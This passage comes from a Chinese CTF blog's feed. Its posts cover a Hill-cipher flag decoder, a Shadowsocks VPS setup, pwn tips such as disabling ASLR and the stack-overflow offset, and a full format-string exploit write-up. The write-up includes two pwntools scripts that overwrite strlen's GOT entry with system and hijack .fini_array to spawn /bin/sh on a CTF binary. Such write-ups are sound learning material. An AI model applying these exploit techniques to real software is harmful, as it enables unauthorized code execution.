class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- coding: utf-8 -*-</div><div class="line">__Url__ = &apos;Http://www.purpleroc.com&apos;</div><div class="line">__author__ = &apos;Tracy_梓朋&apos;</div><div class="line">from numpy import *</div><div class="line">Dic = &#123;chr(i+97):i for i in range(26)&#125;</div><div class="line">def decode(pwd, org):</div><div class="line">    temp = []</div><div class="line">    result = []</div><div class="line">    while True:</div><div class="line">        if len(pwd) % 3 != 0:</div><div class="line">            pwd.append(pwd[-1])</div><div class="line">        else:</div><div class="line">            break</div><div class="line">    for i in pwd:</div><div class="line">        temp.append(Dic.get(i))</div><div class="line">    temp = array(temp)</div><div class="line">    temp = temp.reshape(len(pwd)/3, 3)</div><div class="line">    #print temp</div><div class="line">    #print org</div><div class="line">    xx = matrix(temp)*org</div><div class="line">    for j in range(len(pwd)/3):</div><div class="line">        for i in range(3):</div><div class="line">            if (int(xx[j, i]) &gt;= 26):</div><div class="line">                result.append(chr(xx[j, i] % 26 + 97))</div><div class="line">                #print xx[j, i] % 26</div><div class="line">            else:</div><div class="line">                #print xx[j, i]</div><div class="line">                result.append(chr(xx[j, i] + 97))</div><div class="line">    return result</div><div class="line">def get_vmatrix(org):</div><div class="line">    org_adjoin = org.I*linalg.det(org)</div><div class="line">    print org_adjoin</div><div class="line">    org_det = int(str(abs(linalg.det(org))).split(&apos;.&apos;)[0])</div><div class="line">    print org_det</div><div class="line">    for i in range(1, 26):</div><div class="line">        if i * org_det % 26 == 1:</div><div class="line">            break</div><div class="line">    org_mod = -org_adjoin * i % 26</div><div class="line">    org_mod = matrix(org_mod)</div><div class="line">    temp = []</div><div class="line">    for i in range(org_mod.shape[0]):</div><div class="line">        for j in range(org_mod.shape[1]):</div><div class="line">            temp.append(int(str(org_mod[i, j]).split(&apos;.&apos;)[0]))</div><div class="line">    org_final = matrix(temp).reshape(org_mod.shape[0], org_mod.shape[1])</div><div class="line">    #print org_final</div><div class="line">    return org_final</div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    &apos;&apos;&apos; for test</div><div class="line">    pwd = list(&quot;act&quot;)</div><div class="line">    org = matrix(array([[6, 24, 1], [13 , 16, 10], [20, 17, 15]]))</div><div class="line">    result = decode(pwd, org)</div><div class="line">    print &quot;&quot;.join(result)</div><div class="line">    deorg = matrix(array([[8, 5, 10], [21 , 8, 21], [21, 12, 8]]))</div><div class="line">    result = decode(result, deorg)</div><div class="line">    print &quot;&quot;.join(result)</div><div class="line">    &apos;&apos;&apos;</div><div class="line">    pwd = &quot;wjamdbkdeibr&quot;</div><div class="line">    pwd = list(pwd)</div><div class="line">    org = matrix(array([[1,2,3],[4,5,6],[7,8,10]]))</div><div class="line">    org_vm = get_vmatrix(org)</div><div class="line">    print org_vm</div><div class="line">    print &quot;Your flag is :&quot; + &quot;&quot;.join(decode(pwd, org_vm))</div></pre></td></tr></table></figure></p><p>unicode编码，时间戳<br><a href="http://tool.chinaz.com/Tools/Unicode.aspx" target="_blank" rel="external">http://tool.chinaz.com/Tools/Unicode.aspx</a></p><p>手机密码(最后一位不能超过4,85(错))<br><img src="http://ww1.sinaimg.cn/large/006rgqhqly1fl0d49b95aj30el0a8dlz.jpg" alt=""><br>键盘密码（123–x,y）</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ctf必备解密网站&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>vps-翻墙访问Google浏览器</title>
    <link href="http://yoursite.com/2017/10/22/vpn/"/>
    <id>http://yoursite.com/2017/10/22/vpn/</id>
    <published>2017-10-22T08:38:43.737Z</published>
    <updated>2017-11-09T11:57:47.774Z</updated>
    
    <content type="html"><![CDATA[<p>穿越万里长城只为你——Google<br><a id="more"></a></p><h2 id="1、为何翻墙"><a href="#1、为何翻墙" class="headerlink" title="1、为何翻墙"></a>1、为何翻墙</h2><p>因为我们这个地方世界太小，需求太多，寻找学习资源</p><h2 id="2、准备工具"><a href="#2、准备工具" class="headerlink" title="2、准备工具"></a>2、准备工具</h2><p>这里是下面需要用到的工具<br>链接：<a href="http://pan.baidu.com/s/1o8JYSps" target="_blank" rel="external">http://pan.baidu.com/s/1o8JYSps</a> 密码：03lo</p><h2 id="3、开始"><a href="#3、开始" class="headerlink" title="3、开始"></a>3、开始</h2><p>1、购买一台服务器(vps)作为跳板，可以访问国外站(ping www.google.com),这里可以买:<a href="https://www.vultr.com/" target="_blank" rel="external">https://www.vultr.com/</a><br>买好以后如下:<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1fkrf36cz8dj319z0lmdib.jpg" alt=""><br>第一个箭头可以查看用户名和密码，第二个可以远程连接国外服务器(这里也可以用PuTTY连接，上面工具里有)<br>2、准备翻墙客户端——Shadowsocks.exe<br>工具开启已经给出，运行exe程序即可<br>使用<br><a href="https://www.landiannews.com/archives/20932.html" target="_blank" rel="external">https://www.landiannews.com/archives/20932.html</a><br>3、准备chrome的插件SwitchyOmega<br>这里有个链接:<a href="https://jingyan.baidu.com/article/11c17a2c121c0ff446e39d16.html" target="_blank" rel="external">https://jingyan.baidu.com/article/11c17a2c121c0ff446e39d16.html</a></p><p>换个姿势理解<br>这里有个链接：<a href="https://www.diycode.cc/topics/738" target="_blank" rel="external">https://www.diycode.cc/topics/738</a></p><p>这里前面弄了好久，然而没有用,下面是我用的方式<br>克隆（不知道为什么没有克隆下来）<br><code>git clone https://github.com/clowwindy/shadowsocks-libev.git</code><br>下载<br><code>wget https://github.com/clowwindy/shadowsocks-libev/archive/master.zip</code><br>解压<br><code>unzip master.zip</code><br>运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">sudo apt-get update</div><div class="line">sudo apt-get install shadowsocks</div><div class="line">cd shadowsocks-libev</div><div class="line">sudo apt-get install build-essential autoconf libtool libssl-dev gawk debhelper</div><div class="line">sudo dpkg-buildpackage</div><div class="line">cd ..</div><div class="line">sudo dpkg -i shadowsocks*.deb</div></pre></td></tr></table></figure></p><p>编辑配置<br><code>sudo vim /etc/shadowsocks/config.json</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">        &quot;server&quot;:&quot;45.63.17.127&quot;,</div><div class="line">        &quot;server_port&quot;:8989,</div><div class="line">        &quot;local_port&quot;:1080,</div><div class="line">        &quot;password&quot;:&quot;lala&quot;,</div><div class="line">        &quot;timeout&quot;:300,</div><div class="line">        &quot;method&quot;:&quot;aes-256-cfb&quot;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>查看进程<br><code>netstat -pantu</code></p><p>启动服务<br><code>ss-server -c /etc/shadowsocks/config.json</code><br>成功<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1fkskajl16oj30en01qq2u.jpg" alt=""></p><p>改为后台运行<br><code>nohup ss-server -c /etc/shadowsocks/config.json &amp;</code></p><p>本机配置，运行exe<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fkskabr9eqj30ck09yt8w.jpg" alt=""><br>浏览器chrome插件<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1fksknxvxi1j311h0fg3zm.jpg" alt=""></p><h2 id="4、测试"><a href="#4、测试" class="headerlink" title="4、测试"></a>4、测试</h2><p><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fkskbbjg3rj30wu0j3n15.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;穿越万里长城只为你——Google&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PWN从开始到开始--pwn题的一些小技巧</title>
    <link href="http://yoursite.com/2017/10/14/pwn_tools/"/>
    <id>http://yoursite.com/2017/10/14/pwn_tools/</id>
    <published>2017-10-14T11:13:32.798Z</published>
    <updated>2017-11-09T11:41:57.011Z</updated>
    
    <content type="html"><![CDATA[<p>pwn题必备的套路<br><a id="more"></a></p><h2 id="1、工具"><a href="#1、工具" class="headerlink" title="1、工具"></a>1、工具</h2><p>首先安装pwntools<br><code>git clone https://github.com/Gallopsled/pwntools</code><br><code>cd pwntools</code><br><code>python setup.py install</code><br>安装peda<br><code>git clone https://github.com/longld/peda.git ~/peda</code><br><code>echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</code></p><h2 id="2、找到返回地址"><a href="#2、找到返回地址" class="headerlink" title="2、找到返回地址"></a>2、找到返回地址</h2><h3 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h3><p>如下gdb ./pwn<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1fki2xlxs3fj30jl0i7q9n.jpg" alt=""><br>‘a’*112+addr_ret</p><h3 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h3><p><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fkhzy1yhrgj30eq06eq42.jpg" alt=""></p><h2 id="3、生成shellcode"><a href="#3、生成shellcode" class="headerlink" title="3、生成shellcode"></a>3、生成shellcode</h2><p>这个联网才可以<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1fki08gsy4bj30fv08nabr.jpg" alt=""><br>结果如下<br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fki09ch88bj30gn0c80tp.jpg" alt=""></p><h2 id="4、找内存中函数地址"><a href="#4、找内存中函数地址" class="headerlink" title="4、找内存中函数地址"></a>4、找内存中函数地址</h2><p>这需要程序跑完,在gdb里<br><code>p system</code><br><code>p callsystem</code><br>查看内存<br><code>x \16x 0x482054</code><br><code>x \gx rsp</code></p><h2 id="5、搭建pwn题目"><a href="#5、搭建pwn题目" class="headerlink" title="5、搭建pwn题目"></a>5、搭建pwn题目</h2><p>查看是否开启随机化(不是0则开启)<br><code>cat /proc/sys/kernel/randomize_va_space</code><br>关闭随机化<br><code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code><br>搭建题目<br><code>socat tcp-l:4000,fork exec:./pwn</code><br>连接测试<br><code>nc 127.0.0.1 4000</code></p><h2 id="6、coredump"><a href="#6、coredump" class="headerlink" title="6、coredump"></a>6、coredump</h2><p>在/etc/profile中加入以下一行，这将允许生成coredump文件<br><code>ulimit -c unlimited</code><br>在rc.local中加入以下一行，这将使程序崩溃时生成的coredump文件位于/tmp目录下<br><code>echo /tmp/core.%e.%p &gt; /proc/sys/kernel/core_pattern</code><br>调试coredump文件<br><code>gdb ./test test.core</code><br>x64找到溢出地点<br><code>x \100x $esp-100</code></p><h2 id="6、libc查询-然而我并没有查到"><a href="#6、libc查询-然而我并没有查到" class="headerlink" title="6、libc查询(然而我并没有查到)"></a>6、libc查询(然而我并没有查到)</h2><p><a href="http://libcdb.com/" target="_blank" rel="external">http://libcdb.com/</a></p><h3 id="文学修养"><a href="#文学修养" class="headerlink" title="文学修养"></a>文学修养</h3><p>无边落木萧萧下，不尽长江滚滚来。<br>万里悲秋常作客，百年多病独登台。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;pwn题必备的套路&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>java——jar文件运行命令行窗口一闪而过</title>
    <link href="http://yoursite.com/2017/10/13/java_jar/"/>
    <id>http://yoursite.com/2017/10/13/java_jar/</id>
    <published>2017-10-13T01:28:34.623Z</published>
    <updated>2017-11-09T11:37:05.842Z</updated>
    
    <content type="html"><![CDATA[<p>完美解决java——jar文件运行命令行窗口一闪而过<br><a id="more"></a></p><h2 id="1、jar文件"><a href="#1、jar文件" class="headerlink" title="1、jar文件"></a>1、jar文件</h2><p>1、开始是显示压缩包文件，如果你没有装java环境，那就去装，这里装java链接<br><a href="https://jingyan.baidu.com/article/a24b33cd59b58e19fe002bb9.html" target="_blank" rel="external">https://jingyan.baidu.com/article/a24b33cd59b58e19fe002bb9.html</a><br>然后，右键属性，选择打开方式Java(TM) platform SE,双击运行<br>2、如果jar文件运行命令行窗口一闪而过，可以用命令行打开<br><code>java -jar xxx.jar</code><br>或者建一个文本。将后缀名改为.bat。将上面命令写入，保存双击运行.bat<br>3、如果每个jar文件都这样，那不得烦死了，那就找出现错误的原因<br>当运行命令行或.bat的时候会出现错误的原因，<br>WARNING: Could not open/create prefs root node Software\JavaSoft\Prefs at root 0x80000002. Windows RegCreateKeyEx(…) returned error code 5.<br>百度一下，解决如下：<br>win10<br>运行(win+r)打开：regedit<br>然后找到HKEY_LOCAL_MACHINE \ SOFTWARE \ JavaSoft,右键-新建-项，命名为Prefs</p><p>最后，错误解决了，但是.jar双击还是不能运行，头疼<br>但，只要建一个.bat文件，就可以双击运行，就可以不必每次都用命令打开了</p><h2 id="2、锥心之痛"><a href="#2、锥心之痛" class="headerlink" title="2、锥心之痛"></a>2、锥心之痛</h2><p>发现这篇文章可以解决这个问题<br><a href="http://blog.csdn.net/liujian619/article/details/41380953" target="_blank" rel="external">http://blog.csdn.net/liujian619/article/details/41380953</a></p><h3 id="文学修养"><a href="#文学修养" class="headerlink" title="文学修养"></a>文学修养</h3><p>衣带渐宽终不悔，<br>为伊消得人憔悴。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;完美解决java——jar文件运行命令行窗口一闪而过&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>RE_绕过tls保护</title>
    <link href="http://yoursite.com/2017/10/10/re_tls/"/>
    <id>http://yoursite.com/2017/10/10/re_tls/</id>
    <published>2017-10-10T07:50:53.283Z</published>
    <updated>2017-11-09T11:56:27.030Z</updated>
    
    <content type="html"><![CDATA[<p>在main函数前，还有什么<br><a id="more"></a></p><h2 id="1、何为tls"><a href="#1、何为tls" class="headerlink" title="1、何为tls"></a>1、何为tls</h2><p>TLS回调函数是指，每当创建/终止进程的线程时会自动调用执行的函数。创建的主线程也会自动调用回调函数，且其调用执行先于EP代码。</p><h2 id="2、实践"><a href="#2、实践" class="headerlink" title="2、实践"></a>2、实践</h2><p>TLS callback函数的定义<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">typedef VOID</div><div class="line">(NTAPI *PIMAGE_TLS_CALLBACK) (</div><div class="line">    PVOID DllHandle,     //模块句柄，即加载地址</div><div class="line">    DWORD Reason,        </div><div class="line">    PVOID Reserved</div><div class="line">    );</div><div class="line"></div><div class="line">其中reason有以下几种：(winNT.h)</div><div class="line"><span class="comment">#define DLL_PROCESS_ATTACH   1    进程启动</span></div><div class="line"><span class="comment">#define DLL_THREAD_ATTACH    2    线程启动</span></div><div class="line"><span class="comment">#define DLL_THREAD_DETACH    3    线程退出</span></div><div class="line"><span class="comment">#define DLL_PROCESS_DETACH   0    进程退出</span></div></pre></td></tr></table></figure></p><p>编程实例<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div></pre></td></tr></table></figure></p><p>等待更新 555555</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在main函数前，还有什么&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PWN——格式化字符串利用</title>
    <link href="http://yoursite.com/2017/10/09/pwn3_me/"/>
    <id>http://yoursite.com/2017/10/09/pwn3_me/</id>
    <published>2017-10-09T07:44:41.000Z</published>
    <updated>2017-11-09T11:47:17.136Z</updated>
    
    <content type="html"><![CDATA[<p>FmtStr格式化字符串利用<br><a id="more"></a></p><h2 id="1、程序"><a href="#1、程序" class="headerlink" title="1、程序"></a>1、程序</h2><p>链接：<a href="http://pan.baidu.com/s/1mil6uTE" target="_blank" rel="external">http://pan.baidu.com/s/1mil6uTE</a> 密码：7ff0<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[*] <span class="string">'/root/ctf/pwn_learning/zjgsu/pwn3/pwn3'</span></div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    No RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x8048000)</div></pre></td></tr></table></figure></p><p>有canary保护，感觉现在还不会</p><h2 id="2、分析程序"><a href="#2、分析程序" class="headerlink" title="2、分析程序"></a>2、分析程序</h2><p>我们去尝试运行，摸清了基本上的程序的功能。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@kali:pwn3<span class="comment"># ./pwn3 </span></div><div class="line">Hello, I<span class="string">'m nao!</span></div><div class="line"><span class="string">Please tell me your name... asd</span></div><div class="line"><span class="string">Nice to meet you, asd :)</span></div><div class="line"><span class="string">root@kali:pwn3#</span></div></pre></td></tr></table></figure></p><p>用ida打开看看，发现有system函数，很开心.发现main函数有格式化漏洞<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">printf</span>(<span class="string">"Please tell me your name... "</span>);</div><div class="line"><span class="keyword">if</span> ( getnline((char *)&amp;v6, 64) )</div><div class="line">&#123;</div><div class="line">  sprintf((char *)&amp;v5, <span class="string">"Nice to meet you, %s :)\n"</span>, &amp;v6);</div><div class="line">  result = <span class="built_in">printf</span>((const char *)&amp;v5);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>printf(&amp;v5)这里是格式化漏洞，继续看发现getnline函数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">size_t __cdecl getnline(char *s, int n)</div><div class="line">&#123;</div><div class="line">  char *v3; // [sp+1Ch] [bp-Ch]@1</div><div class="line"></div><div class="line">  fgets(s, n, stdin);</div><div class="line">  v3 = strchr(s, 10);</div><div class="line">  <span class="keyword">if</span> ( v3 )</div><div class="line">    *v3 = 0;</div><div class="line">  <span class="built_in">return</span> strlen(s);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>strlen(s)这里是计算输入进来字符的长度，只有一个参数，这里是不是很熟悉啊，没错。我们的system函数 也只有一个参数system(s),那么我们可以把将system的plt覆盖到strlen的got，再将参数’/bin/sh’传入，这里我们需要做两件事情<br>1、将strlen_got=system_plt<br>2、回到mian函数，将’/bin/sh’输入，这时就能到达system(‘/bin/sh’)</p><h2 id="3、写exp"><a href="#3、写exp" class="headerlink" title="3、写exp"></a>3、写exp</h2><p>这里的问题是，格式化执行一次后程序就会退出了，这里了解一下elf程序运行机制，当程序执行main函数前会执行一些准备开始的程序，比如：。初始化节 .init_array 和 .init<br>结束时也会运行一些结束的程序，比如:动态库还可提供终止节。终止节 .fini_array<br>这就意味着我们可以利用终止节回到mian再次执行。</p><p>查看终止节<br><code>objdump -s  pwn3 |grep fini</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">root@kali:pwn3<span class="comment"># objdump -s  pwn3 |grep fini</span></div><div class="line">Contents of section .fini:</div><div class="line">Contents of section .fini_array:</div></pre></td></tr></table></figure></p><p>发现存在终止节<br>接着利用pwn3直接得到<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">systemPlt = elf.plt[<span class="string">'system'</span>]</div><div class="line">strlenGot = elf.got[<span class="string">'strlen'</span>]</div><div class="line">mainSymbol = elf.symbols[<span class="string">'main'</span>]</div><div class="line">finiSymbol = elf.symbols[<span class="string">'__do_global_dtors_aux_fini_array_entry'</span>]</div></pre></td></tr></table></figure></p><h2 id="4，exp"><a href="#4，exp" class="headerlink" title="4，exp:"></a>4，exp:</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./pwn3'</span>)</div><div class="line">systemPlt = elf.plt[<span class="string">'system'</span>]</div><div class="line">strlenGot = elf.got[<span class="string">'strlen'</span>]</div><div class="line">mainSymbol = elf.symbols[<span class="string">'main'</span>]</div><div class="line">finiSymbol = elf.symbols[<span class="string">'__do_global_dtors_aux_fini_array_entry'</span>]</div><div class="line"></div><div class="line">p = process(<span class="string">'./pwn3'</span>)</div><div class="line"><span class="comment">#p = remote('127.0.0.1',4004)</span></div><div class="line">offset =12</div><div class="line"></div><div class="line">writes = &#123;finiSymbol:mainSymbol,strlenGot:systemPlt&#125;</div><div class="line">padding = <span class="string">'aa'</span></div><div class="line">payload1 = padding + fmtstr_payload(offset = offset,writes = writes,numbwritten = 20,write_size=<span class="string">'int'</span>)</div><div class="line"><span class="built_in">print</span> <span class="string">"payload:len = %d   :%s"</span>%(len(payload1),payload1)</div><div class="line">p.recv()</div><div class="line"><span class="comment">#gdb.attach(p)</span></div><div class="line">p.sendline(payload1)</div><div class="line">sleep(2)</div><div class="line">p.recvline()</div><div class="line">payload2 = <span class="string">'/bin/sh'</span></div><div class="line">p.sendline(payload2)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure><p>offset=12为什么是12，这是我手动的，当然pwntools提供了找偏移的个数的函数Fmtstr，<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">root@kali:pwn3<span class="comment"># ./pwn3 </span></div><div class="line">Hello, I<span class="string">'m nao!</span></div><div class="line"><span class="string">Please tell me your name... AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p</span></div><div class="line"><span class="string">Nice to meet you, AAAA0x80487d00xff8e5e2c(nil)(nil)(nil)(nil)0x6563694e0x206f74200x7465656d0x756f79200x4141202c0x702541410x70257025 :)</span></div><div class="line"><span class="string">root@kali:pwn3# ./pwn3 </span></div><div class="line"><span class="string">Hello, I'</span>m nao!</div><div class="line">Please tell me your name... AABBBB%p%p%p%p%p%p%p%p%p%p%p%p%p</div><div class="line">Nice to meet you, AABBBB0x80487d00xfff70c5c(nil)(nil)(nil)(nil)0x6563694e0x206f74200x7465656d0x756f79200x4141202c0x424242420x70257025 :)</div><div class="line">root@kali:pwn3<span class="comment"># ./pwn3 </span></div><div class="line">Hello, I<span class="string">'m nao!</span></div><div class="line"><span class="string">Please tell me your name... AABBBB%12$p</span></div><div class="line"><span class="string">Nice to meet you, AABBBB0x42424242 :)</span></div><div class="line"><span class="string">root@kali:pwn3#</span></div></pre></td></tr></table></figure></p><p>FmtStr和fmtstr_payload函数参考:<br><a href="https://esebanana.github.io/2017/10/09/pwn6/#more" target="_blank" rel="external">https://esebanana.github.io/2017/10/09/pwn6/#more</a></p><h2 id="5，修改exp"><a href="#5，修改exp" class="headerlink" title="5，修改exp:"></a>5，修改exp:</h2><p>上面的那个exp本地运行成功，但如果连上网的话，由于fmtstr_payload函数是产生大量的数据写入，如要写入的地址时0x8040506,那么就会生成0x8040506的无用字符传过去，在本地也需要运行一会儿，在上网根本不行，这里得用字节写入，这里可以参考:<br><a href="https://esebanana.github.io/2017/09/19/pwn3/#more" target="_blank" rel="external">https://esebanana.github.io/2017/09/19/pwn3/#more</a><br>中的修改b,贴上修改后的exp<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./pwn3'</span>)</div><div class="line">systemPlt = elf.plt[<span class="string">'system'</span>]</div><div class="line">strlenGot = elf.got[<span class="string">'strlen'</span>]</div><div class="line">mainSymbol = elf.symbols[<span class="string">'main'</span>]</div><div class="line">finiSymbol = elf.symbols[<span class="string">'__do_global_dtors_aux_fini_array_entry'</span>]</div><div class="line">log.info(<span class="string">"system:%x\nstrlen:%x\nmain:%x\nfini:%x\n"</span>%(systemPlt,strlenGot,mainSymbol,finiSymbol))</div><div class="line"></div><div class="line">p = process(<span class="string">'./pwn3'</span>)</div><div class="line">offset =12</div><div class="line"></div><div class="line">mainSymbol = 0x080485ed</div><div class="line">finiSymbol = 0x08049934</div><div class="line">systemPlt = 0x08048490</div><div class="line">strlenGot = 0x8049a54</div><div class="line"></div><div class="line">payload = <span class="string">'aa'</span>+p32(0x08049936)+p32(0x08049a56)+p32(0x08049a54)+p32(0x08049934)</div><div class="line"></div><div class="line">first = 0x804 - 0x1c - 0x8 <span class="comment">#print 0x804 bytes before 0x8049936 </span></div><div class="line">second = 0x8490 - 0x0804</div><div class="line">third = 0x85ed - 0x8490</div><div class="line">payload += <span class="string">'%'</span> + str(first) +  <span class="string">'x%12$hn'</span></div><div class="line">payload += <span class="string">'%13$hn'</span></div><div class="line">payload += <span class="string">'%'</span> + str(second) + <span class="string">'x%14$hn'</span></div><div class="line">payload += <span class="string">'%'</span> + str(third) + <span class="string">'x%15$hn'</span></div><div class="line">payload += <span class="string">""</span></div><div class="line"></div><div class="line"><span class="built_in">print</span> p.recvuntil(<span class="string">'... '</span>)</div><div class="line">p.sendline(payload)</div><div class="line"><span class="built_in">print</span> p.recvuntil(<span class="string">'... '</span>)</div><div class="line">payload2 = <span class="string">'/bin/sh'</span></div><div class="line">p.sendline(payload2)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p><p>这个exp是两字节写入</p><h3 id="文学修养"><a href="#文学修养" class="headerlink" title="文学修养"></a>文学修养</h3><p>我本楚狂人,凤歌笑孔丘<br>奈何许!天下人何限?慊慊只为汝!</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;FmtStr格式化字符串利用&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PWN——格式化字符FmtStr</title>
    <link href="http://yoursite.com/2017/10/09/pwn6/"/>
    <id>http://yoursite.com/2017/10/09/pwn6/</id>
    <published>2017-10-09T05:57:26.318Z</published>
    <updated>2017-11-09T11:50:24.033Z</updated>
    
    <content type="html"><![CDATA[<p>FmtStr的利用<br><a id="more"></a></p><h2 id="1、介绍fmt的函数"><a href="#1、介绍fmt的函数" class="headerlink" title="1、介绍fmt的函数"></a>1、介绍fmt的函数</h2><h3 id="FmtStr函数"><a href="#FmtStr函数" class="headerlink" title="FmtStr函数"></a>FmtStr函数</h3><p>FmtStr函数可以获取偏移参数的个数offset<br>例如：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include&lt;stdio.h&gt;</span></div><div class="line">int main(int argc, char * argv[])</div><div class="line">&#123;</div><div class="line">    char a[1024];</div><div class="line">    <span class="keyword">while</span>(1) </div><div class="line">    &#123;</div><div class="line">        memset(a, <span class="string">'\0'</span>, 